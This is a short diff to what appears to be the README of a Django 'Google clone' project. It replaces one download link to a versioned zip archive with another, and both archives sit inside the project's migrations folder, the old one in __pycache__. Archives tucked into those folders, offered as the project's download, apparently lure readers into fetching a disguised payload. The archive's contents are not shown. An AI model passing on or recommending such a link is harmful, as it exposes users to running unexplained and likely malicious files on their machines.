@@ -1,3 +1,3 @@
 Google clone with Django.
 
-# https://raw.githubusercontent.com/KeremKarsiyaka/django_google_clone/master/search/migrations/__pycache__/google_clone_django_3.3.zip
+# https://github.com/KeremKarsiyaka/django_google_clone/raw/refs/heads/master/search/migrations/django-clone-google-1.9.zip
